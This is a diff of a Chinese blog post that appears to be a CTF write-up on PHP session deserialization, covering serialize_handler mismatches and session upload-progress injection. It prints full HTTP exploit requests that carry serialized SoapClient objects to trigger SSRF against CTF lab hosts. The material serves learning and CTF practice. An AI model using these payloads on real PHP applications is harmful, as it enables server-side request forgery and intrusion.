@@ -6,10 +6,10 @@
 
 
 <html class="theme-next muse use-motion" lang="zh-cn">
-<head><meta name="generator" content="Hexo 3.9.0">
-  <meta charset="UTF-8">
-<meta http-equiv="X-UA-Compatible" content="IE=edge">
-<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
 <meta name="theme-color" content="#222">
 
 
@@ -20,8 +20,8 @@
 
 
 
-<meta http-equiv="Cache-Control" content="no-transform">
-<meta http-equiv="Cache-Control" content="no-siteapp">
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
 
 
 
@@ -40,7 +40,7 @@
 
   
   
-  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css">
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
 
 
 
@@ -48,9 +48,9 @@
 
 
 
-<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css">
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
 
-<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css">
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
 
 
   <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
@@ -68,7 +68,7 @@
 
 
 
-  <meta name="keywords" content="php,反序列化,">
+  <meta name="keywords" content="php,反序列化," />
 
 
 
@@ -80,17 +80,18 @@
 
 
 <meta name="description" content="前言前段时间做了下和php session反序列化和原生类利用的题目，现在来总结下 背景知识主要涉及到了php session的存储机制和反序列化中原生类的应用：  php session存储机制php的session默认是存储在文件总中的，存储结构是由session.serialize_handler决定。session.serialize_handler总共有三种值取值：  第一种是php，存">
-<meta name="keywords" content="php,反序列化">
 <meta property="og:type" content="article">
 <meta property="og:title" content="phpsession反序列化">
-<meta property="og:url" content="http://www.star123.top/2020/03/01/phpsession反序列化/index.html">
+<meta property="og:url" content="http://www.star123.top/2020/03/01/phpsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/index.html">
 <meta property="og:site_name" content="star&#39;s blog">
 <meta property="og:description" content="前言前段时间做了下和php session反序列化和原生类利用的题目，现在来总结下 背景知识主要涉及到了php session的存储机制和反序列化中原生类的应用：  php session存储机制php的session默认是存储在文件总中的，存储结构是由session.serialize_handler决定。session.serialize_handler总共有三种值取值：  第一种是php，存">
-<meta property="og:locale" content="zh-cn">
-<meta property="og:updated_time" content="2020-03-03T05:23:30.631Z">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:published_time" content="2020-03-01T14:50:49.000Z">
+<meta property="article:modified_time" content="2020-03-03T05:23:30.631Z">
+<meta property="article:author" content="star">
+<meta property="article:tag" content="php">
+<meta property="article:tag" content="反序列化">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="phpsession反序列化">
-<meta name="twitter:description" content="前言前段时间做了下和php session反序列化和原生类利用的题目，现在来总结下 背景知识主要涉及到了php session的存储机制和反序列化中原生类的应用：  php session存储机制php的session默认是存储在文件总中的，存储结构是由session.serialize_handler决定。session.serialize_handler总共有三种值取值：  第一种是php，存">
 
 
 
@@ -120,7 +121,7 @@
 
 
 
-  <link rel="canonical" href="http://www.star123.top/2020/03/01/phpsession反序列化/">
+  <link rel="canonical" href="http://www.star123.top/2020/03/01/phpsession反序列化/"/>
 
 
 
@@ -136,7 +137,7 @@
 
 
 
-</head>
+<meta name="generator" content="Hexo 4.2.1"></head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-cn">
 
@@ -154,7 +155,7 @@
     
 
     <div class="custom-logo-site-title">
-      <a href="/" class="brand" rel="start">
+      <a href="/"  class="brand" rel="start">
         <span class="logo-line-before"><i></i></span>
         <span class="site-title">star's blog</span>
         <span class="logo-line-after"><i></i></span>
@@ -182,9 +183,9 @@
       
         
         <li class="menu-item menu-item-home">
-          <a href="/" rel="section">
+          <a href="/%20" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-home"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
             
             Home
           </a>
@@ -192,9 +193,9 @@
       
         
         <li class="menu-item menu-item-archives">
-          <a href="/archives/" rel="section">
+          <a href="/archives/%20" rel="section">
             
-              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br>
+              <i class="menu-item-icon fa fa-fw fa-archive"></i> <br />
             
             Archives
           </a>
@@ -233,11 +234,11 @@
   
   
   <div class="post-block">
-    <link itemprop="mainEntityOfPage" href="http://www.star123.top/2020/03/01/phpsession反序列化/">
+    <link itemprop="mainEntityOfPage" href="http://www.star123.top/2020/03/01/phpsession%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
       <meta itemprop="name" content="star">
-      <meta itemprop="description" content>
+      <meta itemprop="description" content="">
       <meta itemprop="image" content="/images/avatar.gif">
     </span>
 
@@ -312,7 +313,7 @@
 <p>当session.serialize_handler为php时，检测到|时，会将|前的内容解析为session的键值，后面的内容会被反序列化为session的内容。如果有这么一种情况，当某一页面serialize_handler为php，而当前默认的session_handler为php_serialize，那么形如p|a:2:{s:1:”a”;i:1;s:1:”b”;i:2;}字符串在session_handler为php的页面session唤起的过程中会被反序列化为一个数组，通过这种手段，我们可以在当前页面的session中注入任意对象。</p>
 </li>
 <li><p>session upload progress导致的安全问题<br>这里先简单地讲一下上传进度相关的几个配置，这里引用php文档的内容。</p>
-<p>当 <code>session.upload_progress.enabled</code> INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。当一个上传在处理中，同时POST一个与INI中设置的 <code>session.upload_progress.name</code>同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 <code>session.upload_progress.prefix</code>与 <code>session.upload_progress.name</code>连接在一起的值。<br><code>session.upload_progress.cleanup</code>选项设置为On时，会在上传完成后自动upload_progress清除的内容。</p>
+<p>当 <code>session.upload_progress.enabled</code> INI 选项开启时，PHP 能够在每一个文件上传时监测上传进度。 这个信息对上传请求自身并没有什么帮助，但在文件上传时应用可以发送一个POST请求到终端（例如通过XHR）来检查这个状态。当一个上传在处理中，同时POST一个与INI中设置的 <code>session.upload_progress.name</code>同名变量时，上传进度可以在$_SESSION中获得。 当PHP检测到这种POST请求时，它会在$_SESSION中添加一组数据, 索引是 <code>session.upload_progress.prefix </code>与 <code>session.upload_progress.name</code>连接在一起的值。<br><code>session.upload_progress.cleanup</code>选项设置为On时，会在上传完成后自动upload_progress清除的内容。</p>
 <p>在默认情况下<code>session.upload_progress.enabled</code>和<code>session.upload_progress.cleanup</code>选项是启动的，所以在这种情况下要达到利用目的需要进行条件竞争。</p>
 </li>
 <li><p>通过soapclient 达成ssrf</p>
@@ -332,13 +333,14 @@
 <li>使用变量覆盖将$b覆盖成call_user_func达到soap_client调用不存在的方法的目的，从而发起ssrf。</li>
 </ol>
 <p>payload</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">POST /?f=session_start&amp;name=|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A16%3A%22http%3A%2F%2F127.0.0.1%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D HTTP/1.1</span><br><span class="line">Host: 26c83e0a-f61a-4971-9422-aa1709739e48.node3.buuoj.cn</span><br><span class="line">Content-Length: 37</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://26c83e0a-f61a-4971-9422-aa1709739e48.node3.buuoj.cn</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://26c83e0a-f61a-4971-9422-aa1709739e48.node3.buuoj.cn/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7</span><br><span class="line">Cookie: _ga=GA1.2.80454834.1580366479; PHPSESSID=tsphtg7hofke44d6g</span><br><span class="line">x-forwarded-for: 127.0.0.1</span><br><span class="line">x-originating-ip: 127.0.0.1</span><br><span class="line">x-remote-ip: 127.0.0.1</span><br><span class="line">x-remote-addr: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">serialize_handler=php_serialize</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST /?f=extract&amp;name=1 HTTP/1.1</span><br><span class="line">Host: 26c83e0a-f61a-4971-9422-aa1709739e48.node3.buuoj.cn</span><br><span class="line">Content-Length: 16</span><br><span class="line">Cache-Control: max-age=0</span><br><span class="line">Origin: http://26c83e0a-f61a-4971-9422-aa1709739e48.node3.buuoj.cn</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.130 Safari/537.36</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9</span><br><span class="line">Referer: http://26c83e0a-f61a-4971-9422-aa1709739e48.node3.buuoj.cn/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en,zh-CN;q=0.9,zh;q=0.8,ja;q=0.7</span><br><span class="line">Cookie: _ga=GA1.2.80454834.1580366479; PHPSESSID=tsphtg7hofke44d6g</span><br><span class="line">x-forwarded-for: 127.0.0.1</span><br><span class="line">x-originating-ip: 127.0.0.1</span><br><span class="line">x-remote-ip: 127.0.0.1</span><br><span class="line">x-remote-addr: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">b=call_user_func</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;?f&#x3D;session_start&amp;name&#x3D;|O%3A10%3A%22SoapClient%22%3A4%3A%7Bs%3A3%3A%22uri%22%3Bs%3A16%3A%22http%3A%2F%2F127.0.0.1%22%3Bs%3A8%3A%22location%22%3Bs%3A25%3A%22http%3A%2F%2F127.0.0.1%2Fflag.php%22%3Bs%3A15%3A%22_stream_context%22%3Bi%3A0%3Bs%3A13%3A%22_soap_version%22%3Bi%3A1%3B%7D HTTP&#x2F;1.1</span><br><span class="line">Host: 26c83e0a-f61a-4971-9422-aa1709739e48.node3.buuoj.cn</span><br><span class="line">Content-Length: 37</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;26c83e0a-f61a-4971-9422-aa1709739e48.node3.buuoj.cn</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;26c83e0a-f61a-4971-9422-aa1709739e48.node3.buuoj.cn&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en,zh-CN;q&#x3D;0.9,zh;q&#x3D;0.8,ja;q&#x3D;0.7</span><br><span class="line">Cookie: _ga&#x3D;GA1.2.80454834.1580366479; PHPSESSID&#x3D;tsphtg7hofke44d6g</span><br><span class="line">x-forwarded-for: 127.0.0.1</span><br><span class="line">x-originating-ip: 127.0.0.1</span><br><span class="line">x-remote-ip: 127.0.0.1</span><br><span class="line">x-remote-addr: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">serialize_handler&#x3D;php_serialize</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">POST &#x2F;?f&#x3D;extract&amp;name&#x3D;1 HTTP&#x2F;1.1</span><br><span class="line">Host: 26c83e0a-f61a-4971-9422-aa1709739e48.node3.buuoj.cn</span><br><span class="line">Content-Length: 16</span><br><span class="line">Cache-Control: max-age&#x3D;0</span><br><span class="line">Origin: http:&#x2F;&#x2F;26c83e0a-f61a-4971-9422-aa1709739e48.node3.buuoj.cn</span><br><span class="line">Upgrade-Insecure-Requests: 1</span><br><span class="line">DNT: 1</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (Macintosh; Intel Mac OS X 10_14_6) AppleWebKit&#x2F;537.36 (KHTML, like Gecko) Chrome&#x2F;79.0.3945.130 Safari&#x2F;537.36</span><br><span class="line">Accept: text&#x2F;html,application&#x2F;xhtml+xml,application&#x2F;xml;q&#x3D;0.9,image&#x2F;webp,image&#x2F;apng,*&#x2F;*;q&#x3D;0.8,application&#x2F;signed-exchange;v&#x3D;b3;q&#x3D;0.9</span><br><span class="line">Referer: http:&#x2F;&#x2F;26c83e0a-f61a-4971-9422-aa1709739e48.node3.buuoj.cn&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: en,zh-CN;q&#x3D;0.9,zh;q&#x3D;0.8,ja;q&#x3D;0.7</span><br><span class="line">Cookie: _ga&#x3D;GA1.2.80454834.1580366479; PHPSESSID&#x3D;tsphtg7hofke44d6g</span><br><span class="line">x-forwarded-for: 127.0.0.1</span><br><span class="line">x-originating-ip: 127.0.0.1</span><br><span class="line">x-remote-ip: 127.0.0.1</span><br><span class="line">x-remote-addr: 127.0.0.1</span><br><span class="line">Connection: close</span><br><span class="line"></span><br><span class="line">b&#x3D;call_user_func</span><br></pre></td></tr></table></figure>
 
 <p>第二个例子是swpuctf的web6这种没有操作session的情况。</p>
 <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//省略部分代码 目标是调用getflag方法</span></span><br><span class="line">se.php</span><br><span class="line">...</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dd</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">        <span class="keyword">public</span> $name;</span><br><span class="line">        <span class="keyword">public</span> $flag;</span><br><span class="line">        <span class="keyword">public</span> $b;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">getflag</span><span class="params">()</span></span></span><br><span class="line"><span class="function">        </span>&#123;</span><br><span class="line">                session_start();</span><br><span class="line">                var_dump($_SESSION);</span><br><span class="line">                <span class="comment">//session中第一个变量需要是array</span></span><br><span class="line">                <span class="comment">//flag作为传参</span></span><br><span class="line">                $a = <span class="keyword">array</span>(reset($_SESSION), <span class="keyword">$this</span>-&gt;flag);</span><br><span class="line">                <span class="keyword">echo</span> call_user_func(<span class="keyword">$this</span>-&gt;b, $a);</span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
 
 <p>这里和上一题不一样，由于没有操作session所以需要用到PHP_SESSION_UPLOAD_PROGRESS来注入session对象。需要注意的是，这里的payload需要放在PHP_SESSION_UPLOAD_PROGRESS这一栏，试过name这一栏发现没用。</p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST /index.php HTTP/1.1</span><br><span class="line">Host: 26cf9497-4109-455c-a23e-188395761f39.node3.buuoj.cn</span><br><span class="line">Content-Type: multipart/form-data;</span><br><span class="line">Referer: http://192.168.3.19/upload/</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.9</span><br><span class="line">Cookie: PHPSESSID=test23</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 521</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryKzdeUKO2QjByVOSs</span><br><span class="line">Content-Disposition: form-data; name=&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">1|O:10:&quot;SoapClient&quot;:5:&#123;s:3:&quot;uri&quot;;s:4:&quot;aaab&quot;;s:8:&quot;location&quot;;s:30:&quot;http://127.0.0.1/interface.php&quot;;s:15:&quot;_stream_context&quot;;i:0;s:11:&quot;_user_agent&quot;;s:58:&quot;wupco</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line">Cookie:user=xZmdm9NxaQ==&quot;;s:13:&quot;_soap_version&quot;;i:1;&#125;</span><br><span class="line">------WebKitFormBoundaryKzdeUKO2QjByVOSs</span><br><span class="line">Content-Disposition: form-data; name=&quot;file&quot;; filename=&quot;&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryKzdeUKO2QjByVOSs--</span><br></pre></td></tr></table></figure>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">POST &#x2F;index.php HTTP&#x2F;1.1</span><br><span class="line">Host: 26cf9497-4109-455c-a23e-188395761f39.node3.buuoj.cn</span><br><span class="line">Content-Type: multipart&#x2F;form-data;</span><br><span class="line">Referer: http:&#x2F;&#x2F;192.168.3.19&#x2F;upload&#x2F;</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept-Language: zh-CN,zh;q&#x3D;0.9</span><br><span class="line">Cookie: PHPSESSID&#x3D;test23</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 521</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryKzdeUKO2QjByVOSs</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;PHP_SESSION_UPLOAD_PROGRESS&quot;</span><br><span class="line"></span><br><span class="line">1|O:10:&quot;SoapClient&quot;:5:&#123;s:3:&quot;uri&quot;;s:4:&quot;aaab&quot;;s:8:&quot;location&quot;;s:30:&quot;http:&#x2F;&#x2F;127.0.0.1&#x2F;interface.php&quot;;s:15:&quot;_stream_context&quot;;i:0;s:11:&quot;_user_agent&quot;;s:58:&quot;wupco</span><br><span class="line">X-Forwarded-For:127.0.0.1</span><br><span class="line">Cookie:user&#x3D;xZmdm9NxaQ&#x3D;&#x3D;&quot;;s:13:&quot;_soap_version&quot;;i:1;&#125;</span><br><span class="line">------WebKitFormBoundaryKzdeUKO2QjByVOSs</span><br><span class="line">Content-Disposition: form-data; name&#x3D;&quot;file&quot;; filename&#x3D;&quot;&quot;</span><br><span class="line">Content-Type: text&#x2F;plain</span><br><span class="line"></span><br><span class="line">------WebKitFormBoundaryKzdeUKO2QjByVOSs--</span><br></pre></td></tr></table></figure>
+
 
 <h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>目前先大概做这么一篇总结，估计日后还要修改。</p>
 
@@ -360,7 +362,7 @@
           
             <a href="/tags/php/" rel="tag"># php</a>
           
-            <a href="/tags/反序列化/" rel="tag"># 反序列化</a>
+            <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag"># 反序列化</a>
           
         </div>
       
@@ -373,7 +375,7 @@
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2020/02/23/php反序列化逃逸/" rel="next" title="php反序列化逃逸">
+              <a href="/2020/02/23/php%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E9%80%83%E9%80%B8/" rel="next" title="php反序列化逃逸">
                 <i class="fa fa-chevron-left"></i> php反序列化逃逸
               </a>
             
@@ -383,7 +385,7 @@
 
           <div class="post-nav-prev post-nav-item">
             
-              <a href="/2020/04/23/ha1ctf部分web题解/" rel="prev" title="ha1ctf部分web题解">
+              <a href="/2020/04/23/ha1ctf%E9%83%A8%E5%88%86web%E9%A2%98%E8%A7%A3/" rel="prev" title="ha1ctf部分web题解">
                 ha1ctf部分web题解 <i class="fa fa-chevron-right"></i>
               </a>
             
@@ -460,9 +462,9 @@
             
               <div class="site-state-item site-state-posts">
               
-                <a href="/archives/">
+                <a href="/archives/%20%7C%7C%20archive">
               
-                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-count">27</span>
                   <span class="site-state-item-name">posts</span>
                 </a>
               </div>
@@ -475,7 +477,7 @@
               
               <div class="site-state-item site-state-tags">
                 
-                  <span class="site-state-item-count">26</span>
+                  <span class="site-state-item-count">27</span>
                   <span class="site-state-item-name">tags</span>
                 
               </div>
